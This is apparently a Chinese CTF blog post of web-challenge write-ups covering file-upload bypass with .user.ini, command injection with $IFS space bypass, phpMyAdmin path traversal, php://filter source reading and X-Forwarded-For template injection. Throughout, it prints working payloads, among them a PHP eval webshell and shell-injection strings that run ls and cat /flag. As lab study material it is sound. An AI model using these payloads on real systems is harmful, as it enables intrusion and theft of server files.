---
layout: post
title: A Example Post
date: 2019-01-01 00:00:00 +0800
category: tutorial
thumbnail: /style/image/thumbnail.png
icon: book
---

## [SUCTF 2019]checkln 1

### 1 <!-- {docsify-ignore} -->


进行上传一句话木马转换的图片后，上传了`.htaccess`文件，不过发现被限制了。
返回了一个：
```SQL
exif_imagetype:not image!
```
<a href=https://www.php.net/manual/zh/function.exif-imagetype.php>exif_imagetype函数</a>
简单来说就是，上传文件白名单机制。
QAQ
新英雄登场
`.user.ini`文件
原为php目录配置文件，作用为：
>当我们访问目录中的任何php文件时，都会调用.user.
ini中指的文件以php的形式进行读取。

我们把我们上传的`.user.ini`文件内容写为
```ini
GIF89a
auto_prepend_file=po.jpg
```
之后就可以常规步骤一顿操作，得到flag。

### 2 其他方法 <!-- {docsify-ignore} -->


这里也有了新一种方法`用传进去的cmd 进行RCE`——其前提是传入的木马文件内容为：
```script
GIF89a 
<script language='php'>eval($_REQUEST['cmd']);</script>
```
然后
```cmd
uploads/xxx/index.php?cmd=var_dump(scandir("/")); // 扫描当前目录下的文件，并打印出来

uploads/xxx/index.php?cmd=system('cat /flag');

uploads/xxx/index.php?cmd=var_dump(file_get_contents("/flag"));
```
### 3 RCE <!-- {docsify-ignore} -->


>远程代码执行 （RCE） 是指一类网络攻击，攻击者在其中远程执行命令以在您的计算机或网络上放置恶意软件或其他恶意代码。在 RCE 攻击中，不需要您的用户输入。远程代码执行漏洞可能会破坏用户的敏感数据，而黑客无需获得对您的网络的物理访问权限。

由于远程代码执行是一个如此宽泛的术语，因此没有一种单一的方法可以预期 RCE 攻击会起作用。一般来说，RCE 攻击分为三个阶段：

- 1.黑客识别网络硬件或软件中的漏洞
- 2.他们会在设备上远程放置恶意代码或恶意软件来利用这个漏洞
- 3.一旦黑客可以访问您的网络，他们就会破坏用户数据或将您的网络用于其他目的。

-----

ps：图片文件头前缀（作用是掩护障眼法）

```txt
JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码）
GIF：47 49 46 38 39 61（ascll值是GIF89a）
PNG： 89 50 4E 47

```

<a href=https://juejin.cn/post/7160512633132171294>常见图片格式之二进制格式分析</a>
<a href=https://www.cnblogs.com/zhiliu/p/16825982.html>参考一下</a>
<a href=https://www.cnblogs.com/cjjcn/p/13954347.html>常见文件头/尾总结</a>


-------
-------

## [GXYCTF2019]Ping Ping Ping 1

依旧是随便点开的一个题目，但很有趣。
主要是想用用firefox渗透版，不太想每次打开burp suite。

### 1 <!-- {docsify-ignore} -->


#### （1）<!-- {docsify-ignore} -->

打开靶场，扑面而来一个
`/?ip=`
（如果有点觉悟就会想起来之前做的文件上传从而意识到这是个URL地址符提示。不过当时没有，甚至在想这是什么代码……php？html？）
于是熟练的打开edge查询wp。
于是
```URL
http://2993ad62-21c8-4f1d-b4d6-05bdd7130b70.node4.buuoj.cn:81/?ip=127.0.0.1;ls
```
喜提
(补充：尝试了一下`&& ls`，什么有用的也没有得到)
```txt
PING 127.0.0.1 (127.0.0.1): 56 data bytes
flag.php
index.php
```
这告诉我们有两个php文件，名字如上。

#### （2） <!-- {docsify-ignore} -->


再用`cat`命令

```url
/?ip=xxx;cat flag.php
```

喜提`fuck your space`。
好嘛，用能想到的space替换符，%20之类的，毫不意外不行。
wp提供了更多的绕过space：
```txt
${IFS}
$IFS$1
${IFS
<> or < 重定向符替换
%09
```
原博一个个试后告诉大家，`$IFS$1`行得通。

```URL
https://xxx/?ip=127.0.0.1;cat$IFS$1flag.php
```

又告诉你不行——因为flag被过滤了。

#### （3）<!-- {docsify-ignore} -->

试一下index.php，
```php
PING 127.0.0.1 (127.0.0.1): 56 data bytes
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}
?>
```

解释一下就是：

- 1. `PING 127.0.0.1 (127.0.0.1): 56 data bytes`：这是一个命令行输出，表示将对IP地址 127.0.0.1 进行Ping测试。`/?ip=`：这是一个URL参数，用于接收要测试的目标IP地址。

- 2. `|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match))`：这是一个正则表达式，用于检查输入的IP地址是否包含特定的符号（ `'`, `"`, `\`, `(`, `)`, `[`, `]`, `{`, `}`）。然后 `echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);`：这一行判断输入的IP地址是否包含特殊字符，并输出匹配结果。最后`die("fxck your symbol!");`：如果前面的正则表达式匹配到特殊字符，将输出错误信息并终止程序运行。

- 3. `preg_match("/ /", $ip)`：这是一个正则表达式，用于检查输入的IP地址是否包含空格。然后`die("fxck your space!");`：如果输入的IP地址包含空格，将输出错误信息并终止程序运行。后面都一样就不重复了。

- 4.  `$a = shell_exec("ping -c 4 ".$ip);`：执行Ping命令，通过shell_exec函数在操作系统中运行命令，并将结果存储在变量$a中。

- 5.`print_r($a);`：打印Ping命令的结果，显示Ping测试的输出信息。

#### （4）<!-- {docsify-ignore} -->


看完这么多过滤，基本可以确定没什么常规的可以写了。
于是一个有趣的就来了：
**改变变量值**

有一个变量`$a`，原本的值是第4条说的，我们进行人为修改（它也没禁止）：
```url
https://xxx/?ip=xxxx;a=g;cat$IFS$1fla$a.php
```
解释一下就是：
```python
a=g
flag=fla$a
```
不懂的永别了.jpg
然后就变成了初始界面。很懵逼是吧。
查看页面源代码获得惊喜。（用注释格式写里面还能怎么说）

-------
-------

## [GWCTF 2019]我有一个数据库1

### 0 <!-- {docsify-ignore} -->


新英雄登场<br>
**DIRSEARCH**<br>
下载安装还搞了半天。
主要体现在直接git下载还少了一些模块，记得下载requirements.txt不然没法用。

----
### 1 <!-- {docsify-ignore} -->


进去以后是非主流文字如果想看懂可以打开开发者工具看响应内容。
然后我就一筹莫展……有数据库……或许SQL injection？
nonono连子目录都不知道in个毛线的jection。
所以打开wp。

我们用<a href=https://blog.csdn.net/m0_48574718/article/details/129244162>dirsearch扫描文件</a>，发现（按wp的说法）<a href=https://www.phpmyadmin.net/>phpmyadmin</a>这个重要显眼的家伙。进去就是一个服务器界面，免密登录非常贴心。



左看右看其实什么也看不到，这时候会感到绝望。不过都到人服务器里面了，就从内爆破吧。wp说该版本的服务器有一个<a href=https://blog.csdn.net/weixin_44037296/article/details/111039461>漏洞</a>

按漏洞说明大胆尝试
```txt
http://xxx/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag
```
一步到位。

----
### 2 <!-- {docsify-ignore} -->


<a href=https://blog.csdn.net/SopRomeo/article/details/105536972>参考一下</a>
<a href=https://blog.csdn.net/m0_47418965/article/details/121708917>phpmyadmin漏洞</a>

-------
-------

## [BSidesCF 2020]Had a bad day 1

>以为是SQLor xss结果是php://filter


### 1 <!-- {docsify-ignore} -->
尝试`?category=xxx`SQL injection语句之后，均出现`xxx.php`不存在的报错信息。都不需要进行爆破了。（需要知道一下源码来理解这种文件后缀名的限制）
所以转向在极客大挑战2019secret file 1里面提到过的`filter`伪协议。

### 2 <!-- {docsify-ignore} -->

所以构建payload`?category=php://filter/convert.base64-encode/resource=index`进行test，然后就会发现一片白茫茫。据solution之言，`"woofers" / "index" / "meowers"`这些被过滤了。
官方solution`?category=php://filter/convert.base64-encode/write=woofers/resource=flag`，额外添加了一个`write=woofers`（替换成meowers也行）。


- `?category=php://filter/convert.base64-encode/resource=flag` 主要是用于读取指定路径下的文件（在本例中，指定路径是 flag），并将其进行 Base64 编码后输出。相当于使用 PHP 的 file_get_contents() 函数读取文件内容，并使用 base64_encode() 函数对其进行编码。

- `payload ?category=php://filter/convert.base64-encode/write=woofers/resource=flag` 则是用于读取指定路径下的文件（同样是 flag），并将其内容进行 Base64 编码后写入到另一个文件 woofers 中。相当于使用 PHP 的 file_get_contents() 函数读取文件内容，并使用 base64_encode() 函数对其进行编码，然后使用 file_put_contents() 函数将编码后的内容写入到指定文件中。

- 这两个 payload 的最大区别在于一个是读取指定文件的内容，一个是将指定文件的内容进行编码后写入到另一个文件中。需要根据实际需求来使用适当的操作。
  
### 3 <!-- {docsify-ignore} -->


再输入payload之后，界面回显了warning和一连串的乱码：
```txt
Warning: include(): unable to locate filiter "woofers" in/var/www/html/index.php on line 37

Warning: include(): Unable to create filiter (woofers) in /var/www/html/index.php on line 37

PCEIL....(一串乱码)
```

解释为：
- 如果无法写入 woofers 文件，那么 PHP 脚本将不会执行 file_put_contents() 函数，也就不可能将编码后的文件内容写入到 woofers 文件中。
- 因此，这时候只有将文件内容直接输出（即回显）。也就是可以看到的下面一排base64编码后的“乱码”。

### 4 <!-- {docsify-ignore} -->

<a href=https://blog.csdn.net/woshilnp/article/details/117266628>php://filter以及死亡绕过</a>
查看solution还提到了<a href=https://www.invicti.com/learn/local-file-inclusion-lfi/>LFI.</a>。
简单了解一下LFI
>Local File Inclusion，允许恶意黑客访问、查看和/或包含位于文档根文件夹中的 Web 服务器文件系统中的文件。

举例说明：如果应用程序被设计为根据 URL 参数显示任意图像，但攻击者能够使用此功能显示应用程序源代码，则该应用程序具有 LFI 漏洞。注意，如果攻击者可以包含来自远程位置的恶意文件，那么我们说的就是远程文件包含(RFI)漏洞。

#### LFI可能出现场景：<!-- {docsify-ignore} -->
- 1.如果应用程序显示任意图像，则可以使用它来显示敏感信息，如源代码或配置文件。

- 2.如果应用程序允许您下载任意文件(如 PDF 文件) ，则可以使用它来下载敏感信息(如源代码或配置文件)。

- 3.如果应用程序包含任意的文件内容作为 HTML 页面的一部分，它可以用来利用跨网站脚本漏洞。

- 4.如果应用程序动态地包含任意源代码文件，并且攻击者能够上传或更改文件，则可以使用该应用程序升级到远程代码执行。

-------
-------


## [BJDCTF2020]The mystery of IP

>怎么也逃不出~burp suite的世界~

### 1 <!-- {docsify-ignore} -->
点来点去没什么头绪，php文件都是摆在明面上的，把页面源代码几个看不懂的都翻译了翻译，发现一个是适配低版本IE浏览器一个是前端实现浮动字效果……心寒……

burpsuite抓包，wp说`IP`->`X-Forwarded-For`（乍一听怪扯的……不过在读过X-Forwarded-For文档里面反复提及的警告后就理解了一点了。）。
所以浅学一下<a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For>X-Forwarded-For</a>。

### 2 <!-- {docsify-ignore} -->
接下来就是添加HTTP请求头

```HTTP
GET /flag.php HTTP/1.1
Host: node4.buuoj.cn:29729
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
X-Forwarded-For:1//是的我添；
Connection: close
```
forward之后界面从`Your IP Is: 10.xx`变成了`Your IP: Is 1`。
injec成功！！
```HTTP
X-Forwarded-For: {{system('ls /')}}
```
进而查找到了**flag**所在位置，接着
```HTTP
X-Forwarded-For: {{system('cat /flag')}}
```



---
### 3 <!-- {docsify-ignore} -->

`X-Forwarded-For` 是一个HTTP 请求头字段。在正常情况下，它用于标识客户端的原始 IP 地址，尤其在经过代理（如负载均衡器、反向代理等）的情况下。（在尝试访问bing.com的时候modifyheader就是利用这个原理）
`X-Forwarded-For: {{system('ls /')}}` 是一个恶意构造的输入，试图通过伪造的 `X-Forwarded-For` 头字段执行系统命令 `ls /` 来获取服务器上根目录的文件列表。然而，这是一种违规和危险的行为，可能会导致系统安全风险和非法访问。
**预防**：
- 1.对于HTTP请求头字段，在正常情况下浏览器会发送真实的客户端IP地址，而不是接受用户输入的X-Forwarded-For值。这样可以避免恶意用户伪造IP地址来执行攻击。
- 2.大多数Web服务器也会验证和过滤请求头字段，确保其中的数据是合法和安全的。
此外，系统管理员也应该采取必要的安全措施来保护服务器免受攻击。这包括配置正确的防火墙规则、定期更新和升级软件以修复安全漏洞，并按照最佳实践设置服务器和应用程序。

-------
-------

## [ACTF2020新生赛]Exec 1

### 1 <!-- {docsify-ignore} -->

主要是讲目录这一个。
打开是一个ping界面，怀疑是SQL injection或者xss。
输入`127.0.0.1`得到
```txt
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.120 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.139 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.100 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.100/0.119/0.139 ms

```

疑惑中带有不解。差点把那个min/avg/max当目录名去了。
### 2 <!-- {docsify-ignore} -->

#### 第一步 <!-- {docsify-ignore} -->
```
127.0.0.1 && ls /
```
得到响应


```

...
round-trip min/avg/max = 0.104/0.151/0.220 ms
bin
dev
etc
flag
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
可以看到它返回了目录列表。
#### 第二步 <!-- {docsify-ignore} -->

```
127.0.0.1 & cat /flag
```
得到
```
flag{ee79ce5d-c618-4380-b2d9-9443537c23aa}
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.144 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.116 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.100 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.100/0.120/0.144 ms
```

-----

### 3 <!-- {docsify-ignore} -->
不过一般来说上述payload会被视为非法请求路径或命令，并返回一个错误页面或者其他类似的响应。但也有存在安全漏洞的web应用。

- ls 显示文件和目录列表
- cat 顺序显示文本文件内容
- dir 显示文件和目录列表，但不带颜色识别

当连接到一个 Web 服务器时，浏览器将通过该服务器提供的文件来访问页面和资源。根目录会根据 Web 服务器的配置而不同。

Web 服务器通常有一个根目录（也称为文档根目录或网站根目录），它是服务器上存储网页和资源的主要目录。当浏览器请求一个页面或资源时，Web 服务器会根据请求的 URL 和配置的规则来确定从哪个位置提供文件。

例如，如果配置的根目录是 `/var/www/html`，那么当浏览器请求 `http://example.com/index.html`时，Web 服务器会在 `/var/www/html` 目录中查找 `index.html` 文件，并将其发送给浏览器作为响应。

因此，当连接到 Web 服务器时，访问的根目录将是由服务器配置决定的，它会从指定的根目录中提供文件和资源。


||作用|
|---|---|
|`&`|个控制操作符，用于在后台同时运行多个命令。它使得第一个命令在后台运行时，可以立即开始执行第二个命令。|
|`&&`|一个逻辑运算符，表示只有在前一个命令执行成功后才会继续执行后面的命令。如果第一个命令执行失败，则第二个命令不会被执行。|
|`ls /`|这个命令将列出根目录下的所有文件和目录。在 Linux 或 Unix 操作系统中，`ls`命令用于列出指定目录中的文件和子目录的名称。`/` 表示根目录，这里的命令将在根目录下执行 `ls`命令，并显示所有文件和目录的名称。
|
|`cat /flag`|显示指定文件的内容，并将其输出到终端上。这里指定文件是`flag`|


## 
